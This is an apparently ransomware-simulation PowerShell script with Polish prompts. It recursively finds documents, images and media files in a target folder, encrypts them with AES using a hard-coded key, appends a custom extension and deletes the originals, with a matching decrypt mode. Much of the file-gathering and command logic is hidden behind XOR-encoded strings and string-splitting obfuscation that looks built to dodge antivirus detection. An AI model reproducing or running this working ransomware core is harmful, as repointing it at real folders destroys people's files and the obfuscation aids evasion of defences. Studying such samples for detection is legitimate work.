
# Define parameters and their defaults
param([string]$Mode,
      [string]$TargetPath = "C:\Users\Kordek\Documents\Ransimtest",
      [string]$Extension = ".skarpetki",
      [string]$Key = "Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L="
)

# Define target file types
$TargetFiles = ("{1}{0}" -f 'df','*.p'),("{1}{0}"-f 's*','*.xl'),("{1}{0}"-f'pt*','*.p'),("{1}{0}"-f 'doc*','*.'),("{1}{0}{2}" -f'.accd','*','*'),("{0}{1}"-f '*.r','tf'),("{1}{0}" -f'xt','*.t'),("{0}{1}"-f'*.c','sv'),("{0}{1}" -f'*.jp','g'),("{2}{0}{1}"-f'pe','g','*.j'),("{0}{1}" -f'*.pn','g'),("{0}{1}"-f '*.','gif'),("{1}{0}" -f 'avi','*.'),("{2}{1}{0}" -f'di','.mi','*'),("{0}{1}" -f'*.','mov'),("{1}{0}"-f'.mp3','*'),("{0}{1}" -f '*.mp','4'),("{0}{2}{1}" -f'*.','eg','mp'),("{0}{1}" -f '*.mp','eg2'),("{1}{0}{2}"-f'.','*','mpeg3'),("{1}{0}" -f'mpg','*.'),("{0}{1}" -f '*.og','g')
Import-Module "$PSScriptRoot\OqTokeiHpv753.psm1"

if ($mode -eq "szyfruj") {
 .((gv '*Mdr*').NaMe[3,11,2]-JoIN'') ( -JoIN ('118Y20P59z62b55d33b6X61Y23l60X49z32b43X34z38R114m111X114Y53R55s38m127l49P58R59s62R54X59l38l55R63Y114m127s34Y51P38P58z114X118l6m51m32d53z55b38Y2X51d38P58s14Y120X114l127Y27R60X49X62z39d54X55d114s118d6d51b32m53Y55b38R20P59s62z55d33P114l127Y23d42l49z62P39Y54l55Y114P120z118s23d42l38R55s60d33d59Y61m60Y114X127b0X55m49Y39b32d33s55z114s127l52d61l32l49Y55P114R46R114X37b58X55l32X55b114P41z114X115z114R118R13Y124d2m1P27P33X17l61z60m38d51Y59l60P55b32P114z47'.SPLIT( 'RzmlbsPXdY')|fOREAch{[cHar]($_-BxOR 0x52 ) }) )
 . ( $PsHoMe[21]+$Pshome[34]+'x')(( '99o9X50@42X1g46@43_34o52_103g122~103o99E1@46E43E34o52l19X40@2E41@36g53g62X55@51l105u43X34o41@32d51u47'.SPlIT( 'goXd_~Elu@' )|% { [ChAr] ( $_-bXor  0x47  )} )-jOIN'')
 
     foreach ($file in $FilesToEncrypt)
    {
        Write-Host "Szyfrowanko $file"
        &('Pr'+'otect'+'-F'+'ile') $file -Algorithm ("{1}{0}"-f'S','AE') -KeyAsPlainText $key -Suffix $Extension -RemoveSource
    }
    w`RiT`E`-hOsT "Zaszyfrowane." | .('St'+'art'+'-Sl'+'eep') -Seconds 10
}

elseif ($mode -eq "deszyfruj") {
    &( $pshome[21]+$pSHome[34]+'X') (((("{9}{1}{18}{10}{17}{3}{6}{29}{19}{30}{21}{0}{22}{25}{24}{11}{28}{27}{7}{31}{20}{5}{4}{13}{16}{26}{12}{8}{15}{2}{14}{23}"-f'em -pat','sF','! nos_.P','crypt','te','x',' = ','e','bB','no','estoD','P','-force i','nsion ','SIs',' where { ','-Recurs','e','il','ild','nosE','t','h ','Container }','get','nosTar','e ','lud','athLpm* -Inc','get-ch','i',' *'))  -REpLAce  ([CHar]110+[CHar]111+[CHar]115),[CHar]36-REpLAce 'Lpm',[CHar]92 -CReplACE  ([CHar]105+[CHar]98+[CHar]66),[CHar]124))

    foreach ($file in $FilestoDecrypt)
    {
        Write-Host "Odszyfrowywanie $file"
         &( $Env:COMSPeC[4,26,25]-JoiN'')(((("{24}{3}{1}{8}{26}{17}{28}{4}{18}{20}{11}{7}{21}{14}{15}{23}{6}{19}{0}{9}{2}{25}{16}{5}{12}{10}{27}{13}{22}" -f'uffix ','ct-File ','x','ote','gorithm ','on  -','tkey','a','zx','zxtE','ov','AsPl','Rem','our','ext ','z','nsi',' ','AES ',' -S','-Key','inT','ce','x','Unpr','te','tfile','eS','-Al'))  -rePLace  'zxt',[Char]36) )
    }
} 

else {
    write-host "ERROR: must choose a mode (encrypt or decrypt). Example usage: .\RanSim.ps1 -mode szyfruj"
}
exit 